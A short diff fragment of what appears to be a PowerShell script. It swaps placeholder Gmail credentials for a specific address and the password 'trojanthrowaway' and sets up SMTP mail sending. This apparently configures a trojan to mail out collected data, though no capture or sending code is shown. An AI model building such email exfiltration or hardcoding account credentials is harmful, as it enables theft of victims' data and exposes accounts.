@@ -3,8 +3,8 @@
 #############################################################################
 
 #Connection Details
-$username="throwawaygmailaccountaddress@gmail.com"
-$password="VeryStr0ngP@$$w0rd!"
+$username="t7610616@gmail.com"
+$password="trojanthrowaway"
 $smtpServer = "smtp.gmail.com"
 $msg = new-object Net.Mail.MailMessage
 
